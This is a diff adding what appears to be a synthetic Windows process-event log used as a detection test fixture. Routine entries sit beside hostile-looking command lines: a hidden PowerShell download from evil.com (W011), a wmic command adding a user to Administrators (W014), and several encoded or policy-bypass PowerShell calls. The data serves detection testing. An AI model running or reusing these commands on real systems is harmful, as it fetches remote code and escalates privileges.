@@ -1,0 +1,31 @@
+event_id,timestamp,host,provider,user,process,parent_process,command_line,status
+W001,2025-06-01T08:15:00Z,SRV-WEB01,Microsoft-Windows-Security-Auditing,jdoe,powershell.exe,explorer.exe,powershell.exe -ExecutionPolicy Bypass -File script.ps1,success
+W002,2025-06-01T08:20:00Z,SRV-WEB01,Microsoft-Windows-Security-Auditing,jdoe,cmd.exe,explorer.exe,cmd.exe /c dir c:\users,success
+W003,2025-06-01T08:30:00Z,SRV-WEB01,Microsoft-Windows-Security-Auditing,admin,powershell.exe,cmd.exe,powershell.exe -EncodedCommand SQBFAFIARQAgAEQAZQBsAGUAdABlAAoA,success
+W004,2025-06-01T09:00:00Z,SRV-DB01,Microsoft-Windows-Security-Auditing,svc_db,sqlservr.exe,services.exe,C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\sqlservr.exe -sMSSQLSERVER,success
+W005,2025-06-01T09:15:00Z,SRV-WEB02,Microsoft-Windows-Security-Auditing,jsmith,chrome.exe,explorer.exe,"C:\Program Files\Google\Chrome\Application\chrome.exe --disable-blink-features=AutomationControlled",success
+W006,2025-06-01T10:00:00Z,SRV-WEB01,Microsoft-Windows-Security-Auditing,jdoe,powershell.exe,explorer.exe,powershell.exe -NoProfile -Command Get-Process,success
+W007,2025-06-01T10:30:00Z,SRV-WEB02,Microsoft-Windows-Security-Auditing,jsmith,powershell.exe,explorer.exe,powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABzACAAPQAgACIAdABlAHMAdAAiAA==,success
+W008,2025-06-01T11:00:00Z,SRV-MAIL01,Microsoft-Windows-Security-Auditing,mmiller,OUTLOOK.EXE,explorer.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE /recycle,success
+W009,2025-06-01T11:30:00Z,SRV-WEB01,Microsoft-Windows-Security-Auditing,jdoe,taskhostw.exe,svchost.exe,C:\Windows\system32\taskhostw.exe,success
+W010,2025-06-01T12:00:00Z,SRV-BACKUP,Microsoft-Windows-Security-Auditing,svc_backup,robocopy.exe,cmd.exe,robocopy C:\Data \\backup-server\share\ /MIR /Z,success
+W011,2025-06-01T12:30:00Z,SRV-WEB02,Microsoft-Windows-Security-Auditing,jsmith,powershell.exe,explorer.exe,powershell.exe -WindowStyle Hidden -NoLogo -NonInteractive -Command "$x=New-Object Net.WebClient;$x.DownloadString('http://evil.com/payload')",success
+W012,2025-06-01T13:00:00Z,SRV-DB01,Microsoft-Windows-Security-Auditing,svc_db,msiexec.exe,services.exe,C:\Windows\System32\msiexec.exe /i "C:\Temp\update.msi" /quiet,success
+W013,2025-06-01T13:30:00Z,SRV-WEB01,Microsoft-Windows-Security-Auditing,jdoe,notepad.exe,explorer.exe,C:\Windows\System32\notepad.exe C:\Users\jdoe\notes.txt,success
+W014,2025-06-01T14:00:00Z,SRV-WEB02,Microsoft-Windows-Security-Auditing,jsmith,wmic.exe,cmd.exe,wmic process call create "cmd.exe /c net localgroup Administrators user /add",success
+W015,2025-06-01T14:30:00Z,SRV-MONITOR,Microsoft-Windows-Security-Auditing,monitor,powershell.exe,explorer.exe,powershell.exe -Command "Get-Service | Where-Object {$_.Status -eq 'Running'}",success
+W016,2025-06-01T15:00:00Z,SRV-WEB01,Microsoft-Windows-Security-Auditing,admin,mmc.exe,explorer.exe,C:\Windows\System32\mmc.exe gpedit.msc,success
+W017,2025-06-01T15:30:00Z,SRV-WEB02,Microsoft-Windows-Security-Auditing,jsmith,powershell.exe,explorer.exe,powershell.exe -Enc SQBFAFIARQAgAEQAZQBsAGUAdABlAA==,success
+W018,2025-06-01T16:00:00Z,SRV-WEB01,Microsoft-Windows-Security-Auditing,jdoe,svchost.exe,services.exe,C:\Windows\System32\svchost.exe -k LocalService,success
+W019,2025-06-01T16:30:00Z,SRV-DB01,Microsoft-Windows-Security-Auditing,svc_backup,powershell.exe,taskeng.exe,powershell.exe -Command "Start-BitsTransfer -Source https://update.contoso.com/patch.msu -Destination C:\Temp\patch.msu",success
+W020,2025-06-01T17:00:00Z,SRV-MAIL01,Microsoft-Windows-Security-Auditing,mmiller,TRANSMGR.exe,svchost.exe,C:\Windows\System32\TRANSMGR.exe,success
+W021,2025-06-01T17:30:00Z,SRV-WEB02,Microsoft-Windows-Security-Auditing,jsmith,powershell.exe,explorer.exe,powershell.exe -frombase64string -Command "test",success
+W022,2025-06-01T18:00:00Z,SRV-WEB01,Microsoft-Windows-Security-Auditing,jdoe,explorer.exe,winlogon.exe,C:\Windows\explorer.exe,success
+W023,2025-06-01T18:30:00Z,SRV-WEB02,Microsoft-Windows-Security-Auditing,jsmith,cmd.exe,explorer.exe,cmd.exe /c "echo %USERNAME%",success
+W024,2025-06-01T19:00:00Z,SRV-DB01,Microsoft-Windows-Security-Auditing,svc_db,sqlservr.exe,services.exe,C:\Program Files\Microsoft SQL Server\MSSQL15.SQLSERVER\MSSQL\Binn\sqlservr.exe -sSQLSERVER,success
+W025,2025-06-01T19:30:00Z,SRV-WEB02,Microsoft-Windows-Security-Auditing,jsmith,powershell.exe,explorer.exe,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand dGVzdA==,success
+W026,2025-06-01T20:00:00Z,SRV-WEB01,Microsoft-Windows-Security-Auditing,admin,taskmgr.exe,explorer.exe,C:\Windows\System32\Taskmgr.exe,success
+W027,2025-06-01T20:30:00Z,SRV-MAIL01,Microsoft-Windows-Security-Auditing,mmiller,powershell.exe,explorer.exe,powershell.exe -Command "Get-Mailbox -ResultSize Unlimited",success
+W028,2025-06-01T21:00:00Z,SRV-WEB02,Microsoft-Windows-Security-Auditing,jsmith,reg.exe,cmd.exe,reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer /v AutoShareWks /t REG_DWORD /d 0 /f,success
+W029,2025-06-01T21:30:00Z,SRV-DB01,Microsoft-Windows-Security-Auditing,svc_db,powershell.exe,explorer.exe,powershell.exe -EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzAA==,success
+W030,2025-06-01T22:00:00Z,SRV-WEB01,Microsoft-Windows-Security-Auditing,jdoe,logonui.exe,winlogon.exe,C:\Windows\System32\LogonUI.exe,success
